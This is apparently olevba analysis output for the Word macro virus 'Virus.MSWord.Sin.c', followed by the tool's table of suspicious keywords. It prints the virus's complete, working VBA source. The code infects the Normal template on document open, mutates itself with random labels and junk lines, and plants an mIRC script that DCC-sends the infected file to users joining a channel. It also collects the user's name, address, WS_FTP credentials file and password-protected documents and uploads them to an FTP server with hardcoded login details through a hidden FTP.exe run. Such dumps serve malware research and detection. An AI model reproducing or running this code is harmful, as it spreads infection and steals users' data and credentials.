olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sin.c-52f0d7c878325db851c59bd583e4f1cb83df53db
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sin.c-52f0d7c878325db851c59bd583e4f1cb83df53db - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
GUHGDKGFQQH:    LordArz = "Technological Illusions"
YUFDCO:    NormInstalled = False
BBBBBB = LL
NOIFKRWE:    ActInstalled = False
EQPBLDQT:  N = BBBB
LKICOFRX:    Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
RBXYHXOLD:    Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule
VVVV = L
UBSPONB:  WWWWW = RRRR
HRHIMIWDN:    NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
FBNJLX:    AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
UYVNBL:    If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
SDEIOMS:    If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True
CCCCCC = MMM
JKVGMFYF:    If NormInstalled = False Then
WGPBMHBHE:    Set Infection = NormCarrier
CBDKAFXMOKA:    Set Carrier = ActCarrier
QFNJPHUINF:    Else
JJJ = G
ADSAVUJHRNN:    Set Infection = ActCarrier
KKKKK = XXXX
BDFJDTW:  XXXX = QQ
XCIYMPMLNI:    Set Carrier = NormCarrier
V = CCC
EUVDWSGVDB:  V = VVVVVV
WDFTLMML:    End If
FFFGGJFY:    DoEvents
GNQTSWJQ:    Close
XMPVOL:    Tr1 = Dir(CurDir & "\script.ini", vbNormal)
ACOWWMRCEJW:    Tr2 = UCase(Right(CurDir, 8))
UU = JJJJJ
UQGGKATB:    Tr3 = Dir("C" & Chr(58) & "\MIRC", vbDirectory)
TLTPKBK:    If Tr1 <> "" Then SDir = CurDir & "\script.ini"
DHUCUOHBEUM:    If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
TYNMFSF:    If Tr3 <> "" Then SDir = "C" & Chr(58) & "\MIRC\Script.ini"
LLL = MMMMM
DNUXPKOPOO:    If SDir <> "" Then
TBSNMKLF:  BBBB = JJJJ
VCLUTLKMK:    Open SDir For Output As #1
MJEYYXNUUS:    Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
TKYNFAQOBW:  IIIIII = KKKKK
TQKOVVV:    Close #1
XRUKVCLB:    End If
RXYDPGDPQ:    DoEvents
FF = KKKKK
WJNKAEVQAL:    WinPath = Environ("WINDIR")
HKQHSYJABPU:    If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Or System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") >= Day(Date) + 14 Then
TTTT = SSSSS
BYILFJUA:    With Application.FileSearch
RQKDWDOURTY:    .FileName = "WS_FTP.ini"
UU = DDD
HJNWXBUKQM:    .LookIn = "C" & Chr(58) & "\"
UAVEDAYJSW:    .SearchSubFolders = True
FFFFF = C
KYNMAVW:    .MatchTextExactly = True
QDEXPQSLA:    .FileType = msoFileTypeAllFiles
ARVAAFB:    .Execute
VYPWDHLLP:    WsPath = .FoundFiles(1)
ORGUXYPMAOQ:    End With
VNMCMRHHMFE:    DoEvents
QTBBRYTELMC:    If ActiveDocument.HasPassword = True Then BCK = True
SLQCYDXULAP:    DoEvents
ANQNOY:  EEEEE = YYYYYY
JJJJ = RRRR
IXBIYDDC:    Open WinPath & "\" & Application.UserName & ".dat" For Output As #10
O = JJJJJJ
LNRLJGF:  AAAAA = OO
HVMLDXOKUGV:    Print #10, Application.UserName
DSFEGWJA:    Print #10, Application.UserAddress
FLHYATL:    If BCK = True Then Print #10, ActiveDocument.FullName
DDGKLH:    If WsPath <> "" Then Print #10, "WS_FTP"
VMXJDCEYRQ:  P = WW
OOOOO = LLLLLL
TTCFVGUQSKE:    Close #10
YSHEFARKJX:    Open WinPath & "\Command.$$$" For Output As #8
DYDRJCJ:    Print #8, "o ftp.xoom.com"
PGQDJMR:    Print #8, "User SingOfScream"
WFMQAKI:    Print #8, "Pass DIG001"
NMJJOQCQM:    Print #8, "binary"
IIIII = NNN
KIPHKSFEY:  DDD = DD
SSS = GGGG
VCOYWPGHDPE:    Print #8, "put " & Application.UserName & ".dat"
NBWTYAGBF:    If WsPath <> "" Then Print #8, "put " & WsPath
AQDEIWIBKS:    If BCK = True Then Print #8, "put " & ActiveDocument.FullName
XPYBBIWJ:    Print #8, "quit"
TGEFXPYPON:    Close
WKVOIRP:    Shell WinPath & "command.com /c FTP.exe -n -s:Command.$$$", vbHide
GWDJAR:    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = Day(Date)
JAWFRQLEDN:    End If
LAXLPSNWWJ:    For x = 1 To ThisDocument.Variables.Count
DDXDDY:    ThisDocument.Variables(x).Delete
QHPBFD:    Next x
KKKKKK = K
OYCWIIMQR:    For x = 1 To Normal.ThisDocument.Variables.Count
LLDUXMUSSR:    Normal.ThisDocument.Variables(x).Delete
WUNXIYDJQX:    Next x
LBCFHD:    With Carrier
PVGOJDC:    UECode = .Lines(1, 2) & Chr(13)
AEBMOT:  IIIII = NNNN
IXDUPHWFJ:    For x = 5 To .CountOfLines - 1
LGYJQUWYC:  GG = GGGGG
VHEOIKNRQS:    VCCode = .Lines(x, 1)
JOOMCI:    If VCCode = "End Sub" Then Exit For
FUBYETWMUU:    For i = 1 To 20
XLRDIJRGXB:    If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
XQVWVBTJAA:  BBBBBB = VVVVVV
ACPLUE:    Next i
RRRRR = CCCCC
WYCIVQO:    factor = ""
RNLLKYUTS:    For Y = 1 To Int(Rnd * 6) + 6
D = LLLLL
VUXALG:  GGG = AAAA
SSS = SSSSSS
SRMSEJPBFQV:    factor = factor & Chr(Int(Rnd * 25) + 65)
OWCUYAY:  FFFFF = HH
JFMGSVRV:    Next Y
UIVUJHDOJW:    make_morph = factor & ": "
CCCC = TT
JVUKYPFICUA:    VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
KAVKSEEBE:  MMMMMM = MMMMM
FITVGJNIBNJ:    If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(13)
BBBB = FFFF
CHPYHRDTA:    Next x
XPPCBBW:    VirCode = UECode & VirCode & "End Sub"
PDJEFFOK:    End With
VCIDRVCS:    Normal.ThisDocument.Variables.Add "VCode", VirCode
JAITHPW:    ResetMe = "Private Sub Document_Close()" & Chr(13)
VWMQQYA:  DDDDDD = QQQ
DBIVBAOBUYM:    ResetMe = ResetMe & String(150, Chr(9)) & "With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
YYNXLVEHTD:    ResetMe = ResetMe & "End Sub"
DDCYUEWWK:    With ActCarrier
UQBOICEEXJX:    .DeleteLines 1, .CountOfLines
RAIDFTHT:    .InsertLines 1, ResetMe
NHVTUGFMKA:    End With
GQYTPXRKLGG:    With NormCarrier
JSJVBI:  IIIII = W
WWWWWW = YYY
PGCQNB:    .DeleteLines 1, .CountOfLines
GKYOOEPXS:    .InsertLines 1, ResetMe
NNNN = QQQQQQ
JTMRLO:  MMMM = OOOOOO
JJJJJJ = III
NHKIELEJBUD:    End With
JOHQQG:    ActiveDocument.Save
IIMAILUC:    NormalTemplate.Save
LL = F
FLRCREOVR:  QQQQQQ = FFFFF
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

